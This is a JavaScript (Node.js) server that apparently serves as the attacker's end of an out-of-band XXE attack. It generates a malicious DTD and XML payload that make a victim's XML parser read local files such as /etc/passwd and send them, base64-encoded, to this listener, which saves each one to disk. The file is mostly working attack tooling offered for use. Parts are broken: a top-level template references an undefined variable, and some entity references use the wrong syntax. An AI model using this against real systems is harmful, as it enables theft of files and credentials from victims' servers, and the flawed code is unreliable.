const http = require('http');
const url = require('url');
const fs = require('fs');

const LISTEN_IP_ADDRESS = '0.0.0.0';
const LISTEN_PORT = 5327;

const FILES_PATH = `${__dirname}/files`;
const EVIL_DTD_FILE_NAME = 'evil_DTD.dtd';

console.log(`FILES_PATH: ${FILES_PATH}`);

// Command Line ARGS (no argv[0] and no argv[1])
const ARGS = process.argv.slice(2);

console.log(`CONSOLE ARGS: ${ARGS}`);

// let template_evil_DTD = `
// <!-- Put this file in a web server reachable by the attacker machine -->
// <!ENTITY % ResourceToRead SYSTEM "file://${reqUrl.query.f}"> <!-- File to read in victim machine -->
// <!ENTITY % LoadOOBEntity "<!ENTITY &#37; OOB SYSTEM 'http://<IP_ATTACKER_LISTENER>:${LISTEN_PORT}/?p=%ResourceToRead;'>"> <!-- Listener on the attacker machine -->
// `;

let template_evil_DTD = `
<!-- Put this file in a web server reachable by the attacker machine -->
<!ENTITY % ResourceToRead SYSTEM "${reqUrl.query.resource}"> <!-- File to read in victim machine -->
<!ENTITY % LoadOOBEntity "<!ENTITY &#37; OOB SYSTEM 'http://<IP_ATTACKER_LISTENER>:${LISTEN_PORT}/?p=%ResourceToRead;'>"> <!-- Listener on the attacker machine -->
`;

// ##################################
// #
// #  HTTP SERVER
// #
// ##################################
http.createServer((req, res) => {

    const reqUrl = url.parse(req.url, true);

    // GET Endpoint
    if(req.method === 'GET') {

        // Test request
        if(reqUrl.pathname == '/test') {
            res.statusCode = 200;
            res.setHeader('Content-Type', 'text/html');
            res.end(`Test is working`);
        }

        if (reqUrl.pathname == '/' && reqUrl.query.p !== null && reqUrl.query.p !== undefined) {
            console.log('>>>> Ivoked /');
            res.statusCode = 200;
            res.setHeader('Content-Type', 'text/html');

            let fileName = `${FILES_PATH}/${req.connection.remoteAddress}_${Date.now()}`;
            console.log(`fileName: ${fileName}`);

            fs.writeFile(fileName, reqUrl.query.p, function (err) {
                if (err) throw err;
                console.log('File is created successfully.');
            });

            res.end(reqUrl.query.p);
        }

        // Attacker call this GET REST API to get the DTD to inject (i.e. in Burp Request)
        if(reqUrl.pathname == '/evilXml') {
            console.log('>>>> Ivoked /evilXml');

            if(reqUrl.query.resource !== null && reqUrl.query.resource !== undefined) {
                console.log(`Resource to steal from victim: ${reqUrl.query.resource}`);
            }
            else {
                console.log(`Resource to steal from victim: ${reqUrl.query.resource}`);
                res.statusCode = 200;
                res.setHeader('Content-Type', 'text/html');
                res.end(`No resource specified.\nA "resource" query parameter must be specfied (ex. /evilXml/resource=/etc/passwd) `);

            }

            let evil_DTD = `
                <!ENTITY % ResourceToRead SYSTEM "php://filter/read=convert.base64-encode/resource=file://${reqUrl.query.resource}"> <!-- File to read in victim machine -->
                <!ENTITY % LoadOOBEntity "<!ENTITY &#37; OOB SYSTEM 'http://${req.headers.host}/?p=%ResourceToRead;'>"> <!-- Listener on the attacker machine -->
            `;

            fs.writeFileSync(EVIL_DTD_FILE_NAME, evil_DTD);
            console.log(`Created ${EVIL_DTD_FILE_NAME} with content:`);
            console.log(`${evil_DTD}`);


            let evil_XML = `
                <!DOCTYPE XXEOOB [
                    <!ENTITY % EvilDTD SYSTEM "http://${req.headers.host}/${EVIL_DTD_FILE_NAME}">

                    &EvilDTD;
                    &LoadOOBEntity; <!-- entity of the evil_DTD file -->
                    &OOB; <!-- entity of the evil_DTD file -->
                ]>
            `;

            res.statusCode = 200;
            res.setHeader('Content-Type', 'text/html');
            res.end(`${evil_XML}`);

        }
    }

}).listen(LISTEN_PORT, LISTEN_IP_ADDRESS, () => {
    console.log(`Server listening on ${LISTEN_IP_ADDRESS}:${LISTEN_PORT}...`);
});
